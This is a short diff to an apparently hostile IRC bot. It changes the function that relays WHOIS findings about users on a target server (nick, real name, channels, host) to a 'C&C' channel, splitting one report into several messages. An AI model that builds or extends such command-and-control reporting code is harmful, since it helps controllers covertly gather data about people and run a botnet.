@@ -186,9 +186,16 @@ def ParseResult(result):
 
 def SendWhois(res):
     """Send Whois results to C&C."""
-    msg = "Whois report: "+res.Nick+"'s Real name is: "+res.Name+"  "
-    msg = msg + "Channels:" + res.Chan + " HOST:" + res.Host + " on "+TRGT_HOST
-    bot.say(CC_CHANNEL, "Results for WHOIS: {}".format(msg))
+    bot.say(CC_CHANNEL, "Results for WHOIS on: " + TRGT_HOST)
+    msg = "NICK: "+res.Nick+". NAME: "+res.Name
+    print(msg)
+    bot.say(CC_CHANNEL, msg)
+    msg = "CHANNELS: " + res.Chan
+    print(msg)
+    bot.say(CC_CHANNEL, msg)
+    msg = "HOST: " + res.Host
+    print(msg)
+    bot.say(CC_CHANNEL, msg)
 
 
 @bot.on("message")
